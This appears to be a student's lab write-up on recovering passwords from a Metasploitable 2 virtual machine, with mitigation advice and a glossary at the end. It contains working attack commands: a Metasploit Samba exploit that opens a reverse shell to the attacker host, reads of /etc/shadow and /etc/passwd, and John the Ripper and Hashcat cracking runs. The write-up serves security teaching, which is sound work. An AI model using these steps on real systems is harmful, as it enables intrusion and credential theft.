# Password Cracking on an Open-Source System (Metasploitable2)



## Project Overview

In this project, I demonstrate how to recover passwords from an open-source vulnerable system (Metasploitable 2) using various password cracking techniques and tools. The objective was to simulate a real-world post-exploitation scenario where an attacker extracts hashed passwords from a compromised system and attempts to recover the original plaintext passwords using dictionary and brute-force attacks.


> **Note**: This project is for educational purposes only. All tests were conducted in a controlled lab environment using vulnerable machines designed for ethical hacking practice.

## Environment Setup

| Component        | Description                             |
|------------------|-----------------------------------------|
| **Attacker Machine**  | Kali Linux |
| Attacker IP | `192.168.56.102`       |
| **Target Machine**    | Metasploitable 2 
| Target IP| `192.168.56.104` |
| **Network Type** | Host-Only Adapter                       |

### Confirming connectivity
```
ifconfig    # To check the IP addresses of both machines
```
```
ping 192.168.56.104  # From Kali to Metasploitable
```
```
ping 192.168.56.102  # From Metasploitable to Kali
```
Both virtual machines were set up using VirtualBox to ensure seamless internal communication. VMware was initially used, but later replaced due to network configuration challenges.

## Getting Access and Extracting Hashes

Although exploitation wasn't the core of the assignment, initial access to the Metasploitable 2 system was needed.

Once enumeration revealed the SMB service on Metasploitable 2, I used Metasploit to exploit it:

```bash
msfconsole
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.56.104
set PAYLOAD cmd/unix/reverse
set LHOST 192.168.56.102
exploit
```
Once shell access was gained:
```
cat /etc/passwd
cat /etc/shadow
```
Due to issues with scp in copying the content to my machine ("host key verification failed"), I copied the contents manually from the shell into my local files:
```
nano shadow.txt      # Pasted contents from /etc/shadow
nano passwd.txt      # Pasted contents from /etc/passwd
```
Then I combined the hash files...waiting to be cracked with John The Ripper:
```
unshadow passwd.txt shadow.txt > hashes.txt
```

## Password Cracking Process

### Using John The Ripper with `rockyou` wordlist:
```
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
Successfully cracked 3/7 hashes:

- `sys:batman`

- `klog:123456789`

- `service:service`

John The Ripper returned the hash format to be `md5crypt`

### Preparing for Hashcat Cracking
```bash
cut -d: -f2 shadow.txt > md5.hash
```
This command extracts only the hashed password portion from the `shadow.txt` file.

### Using Hashcat with wordlist from Seclists
```
hashcat -m 500 md5.hash /usr/share/wordlists/xato-net-10-million-passwords.txt --force
```
Successfully cracked 4/7 passwords, including `user:user`.

- SecLists Download: `git clone https://github.com/danielmiessler/SecLists.git`

```
hashcat -m 500 md5.hash --show
```
The line above displays the crack result.

To associate the cracked hash with usernames, I matched the row numbers from `md5.hash` to `hashes.txt`.

```
# Line 4 in md5.hash corresponds to line 4 in hashes.txt
# Thus matched cracked password to user
```

### Using the Dirb's `common.txt` for cracking again
```
hashcat -m 500 md5.hash /usr/share/wordlists/dirb/common.txt --force
```
Successfully cracked 5/7 passwords, including `postgres:postgres`.

### Online Cracking via hashes.com
Pasted the remaining hashes, and the site returned:

`msfadmin:msfadmin`

`postgres:postgres`

Successfully cracked 6/7 passwords, including `msfadmin:msfadmin`

### Remaining: Password for the "Root"  username
Despite multiple dictionary attempts, the root password remained uncracked. It would require brute-force techniques:

```bash
hashcat -m 500 -a 3 root.hash ?a?a?a?a?a?a?a --force
```
This was a brute-force attempt that would take a lot of time and processing power.
Warning: Brute force is extremely resource-intensive and may take a long time so I stopped the bruteforce attack midway `ctrl + c`
It won't take as much time with very short passwords.

![cat-shadow-passwd](screenshots/etc_passwd.png)

*After gaining shell access, I used `cat` to view `/etc/shadow` and `/etc/passwd`, containing hashed user passwords and usernames respectively.*


### Manual Copy of Shadow and Passwd Files

![copy-shadow-passwd](screenshots/shadow_passwd.png)

*Because `scp` returned a host key verification error, I manually copied the content of both files into new text files on my attacker machine.*


### Cracking Hashes with John the Ripper

![john_crack](screenshots/john_rockyou.png)
![john_crack](screenshots/john_result.png)

*Using `john` and the RockYou wordlist, I successfully cracked 3 out of 7 hashes from the unshadowed file.*


### Using Hashcat with a Different Wordlist

![hashcat_cracking](screenshots/hashcat_result2.png)
![hashcat_cracking](screenshots/hashcat_result.png)

*Here, I used `hashcat` with the Xato 10 million password list. Hashcat successfully cracked an additional password (`user:user`).*

### Mapping out the hashes to the usernames 

![mapping](screenshots/txt_hash.png)

*Since hashcat cracked just the password hashes, I opened up the `hashes.txt`, `md5.hash` and the `cracked results from the terminal` side by side for easy mapping of username to password/hash with the row numbers.*

### Online Cracking with Hashes.com

## Mitigation Recommendations

After successfully recovering several hashed passwords from an open-source system as demostrated, it's important to reflect on how such attacks can be prevented in real-world environments. Below are key mitigation strategies that organizations and system administrators should implement to defend against password cracking attacks.

### 1. Use Strong Password Policies
Weak or predictable passwords make brute-force and dictionary attacks highly effective. Enforce strong password policies such as:
- Passphrases
- Minimum of 12 characters
- Mix of uppercase, lowercase, numbers, and symbols
- No dictionary words or common patterns
- Regular password updates

Example (Strong Passphrase):Irep@iredMyGhostF!leYe@r$Back
*It simply says....*
*"I repaired my ghost file years back*
*I hope you realise how simple it'll be to memorise but hard for bruteforce attacks*

### 2. Enforce Account Lockout Policies
Account lockouts after a defined number of failed login attempts help prevent automated brute-force attacks.
- Lock account after 5 incorrect attempts
- Enable automatic unlocking after a cooldown period
- Alert administrators upon repeated failures

### 3. Salt Passwords Before Hashing
Salting adds a unique random string to each password before hashing, which makes precomputed hash attacks (like rainbow tables) ineffective.
- Store a unique salt with each userâ€™s record
- Combine salt + password before hashing

### 4. Use Strong Hashing Algorithms
Outdated hash functions like **MD5**, **SHA1**, or even **MD5crypt** are vulnerable to fast cracking.
- Use modern hashing algorithms like:
  - `bcrypt`
  - `scrypt`
  - `Argon2`
- These are designed to be **slow and resource-intensive**, making them impractical to brute-force.

### 5. Implement Multi-Factor Authentication (MFA)
Even if an attacker cracks a userâ€™s password, MFA provides an additional layer of defense.
- Use email-based codes, authenticator apps, or biometric verification.
- Enforce MFA for all admin and remote login users.

### 6. Restrict Remote Access Services
Limit or disable services like:
- Telnet
- FTP
- SMB
Unless very necessary, but always protect them with proper authentication.

### 7. Monitor and Audit System Logs
Detect brute-force attempts early by:
- Logging failed login attempts
- Monitoring unusual patterns such as login attempts from unknown IPs
- Using intrusion detection systems (IDS) like **Snort**

### 8. Educate Users
Most users are unaware of password security best practices. Conduct regular cybersecurity awareness training covering:
- Creating strong passwords
- Recognizing phishing attempts
- Reporting suspicious activity

## Conclusion

Through this project, I successfully demonstrated post-exploitation password recovery on an open-source vulnerable system using ethical hacking techniques. Out of 7 user accounts, 6 passwords were cracked using John the Ripper, Hashcat, and online tools. The root user remained uncracked and was left as a candidate for brute-force cracking. This showcases the real-world importance of strong passwords and security policies on Unix-based systems.

## Glossary of Key Terms

This section explains important cybersecurity and Linux-related terms used in this project in simple language for beginners.

### Password Hash
- A **hash** is a scrambled version of a password created using a mathematical function. Hashes are stored instead of plain-text passwords to enhance security.

### `/etc/passwd` and `/etc/shadow`
- `/etc/passwd`: A file on Linux systems that stores basic user account information.
- `/etc/shadow`: Stores the hashed passwords of users. Only root or privileged users can access it.

### John the Ripper
- A popular **password cracking tool** that guesses passwords by comparing password hashes with a list of possible passwords called a "dictionary" or "wordlist".

### Hashcat
- An advanced **GPU-powered password cracker**. It's faster and more flexible than John the Ripper and supports many hash formats.

### Dictionary Attack
- A type of attack where the cracker tries passwords from a pre-built list (wordlist) just like trying all words in a dictionary to find the correct one.

### Brute-Force Attack
- An attack where the cracker tries **every possible combination** of characters until the correct password is found. Itâ€™s powerful but time-consuming.

### SMB (Server Message Block)
- A protocol that allows **file sharing over a network**. Often used in Windows environments, but also supported on Linux using Samba.

### Samba
- A **Linux implementation of SMB**. It allows Linux and Windows systems to share files and printers. Can be vulnerable if outdated or misconfigured. (This is what I exploited to gain access to the target machine)

### Exploit
- Simply means taking advantage of a vulnerability in a system or service. In this project, I used an exploit to get shell access just as I said above.

### Shell Access
- Direct access to the command-line interface of a system. Gaining shell access means the attacker can run commands on the target machine.

### Metasploit
- A powerful penetration testing framework used to find and exploit vulnerabilities in systems.

### `unshadow`
- A Linux tool that combines `/etc/passwd` and `/etc/shadow` into a single file that password crackers can use to try cracking passwords.

### `scp` (Secure Copy)
- A command used to securely transfer files between computers over SSH. Used to download sensitive files from the target.

### `md5crypt`
- A hash algorithm used to protect passwords. Itâ€™s older and less secure than modern algorithms like bcrypt.

### Wordlist
- A file that contains a list of commonly used passwords. Examples: `rockyou.txt`, `common.txt`, `xato-net-10-million-passwords.txt`.

### `.potfile` (Hashcat/John Output)
- A file where cracked hashes and passwords are stored after a successful crack. If a hash is already in this file, the tool skips it during future runs.

### Token Length Exception
- An error in hashcat when a hash line is too long or not in the expected format. Usually due to formatting issues in the hash file.

### hashes.com
- A free online hash cracking service that checks your hash against their large database of already cracked passwords.

## My Take
This project deepened my practical understanding of password cracking techniques, the importance of securing Linux systems, and the real-world hurdles cybersecurity professionals face during penetration testing. I gained hands-on experience with tools like John the Ripper and Hashcat and also learned how network setup, service enumeration, and file access play a crucial role in successful exploit execution and hash retrieval.
